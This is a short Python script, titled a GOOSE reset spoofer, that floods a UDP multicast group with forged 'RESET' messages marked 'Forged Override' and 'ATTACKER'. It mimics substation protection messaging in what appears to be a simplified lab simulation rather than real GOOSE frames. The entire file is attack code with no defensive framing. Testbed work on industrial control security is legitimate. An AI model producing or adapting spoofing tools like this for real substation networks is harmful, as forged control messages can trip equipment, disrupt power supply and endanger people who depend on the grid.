"""
GOOSE reset spoofer

Author: Zein Ali
Date: 01/07/2025
"""

import socket
import json
import time
import random

MCAST = "224.1.1.1"
PORT = 10200

def checksum(msg):
    return abs(hash(json.dumps(msg))) % 100000

def run():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)

    while True:
        msg = {
            "goID": "GOOSE1",
            "status": "RESET",
            "reason": "Forged Override",
            "stNum": 999,
            "sqNum": random.randint(1, 9999),
            "timestamp": time.time(),
            "role": "ATTACKER"
        }
        msg["checksum"] = checksum(msg)
        s.sendto(json.dumps(msg).encode(), (MCAST, PORT))
        print(f"Sent spoofed GOOSE reset: {msg}")
        time.sleep(1)

if __name__ == "__main__":
    run()
